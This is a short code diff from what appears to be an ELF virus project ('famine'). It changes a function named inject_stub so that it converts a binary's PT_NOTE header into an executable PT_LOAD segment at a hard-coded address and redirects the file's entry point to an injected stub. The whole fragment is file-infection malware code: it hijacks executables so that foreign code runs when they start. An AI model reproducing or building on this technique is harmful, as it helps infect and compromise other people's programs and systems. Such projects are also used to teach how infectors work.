@@ -1,5 +1,7 @@
 #include "../include/famine.h"
 
+# define STUB_VADDR 0xc000000
+
 /*
 * @brief Finds an 8-byte sentinel inside the copied stub and overwrites it.
 */
@@ -27,12 +29,12 @@ void	inject_stub(t_famine *f)
 	f->note->p_type = PT_LOAD;
 	f->note->p_flags = PF_R | PF_X;
 	f->note->p_offset = f->stub_offset;
-	f->note->p_vaddr = f->stub_vaddr;
-	f->note->p_paddr = f->stub_vaddr;
+	f->note->p_vaddr = STUB_VADDR;
+	f->note->p_paddr = STUB_VADDR;
 	f->note->p_filesz = stub_bin_len;
 	f->note->p_memsz = stub_bin_len;
 	f->note->p_align = PAGE_SIZE;
 
-	f->ehdr->e_entry = f->stub_vaddr;
+	f->ehdr->e_entry = STUB_VADDR;
 }
 
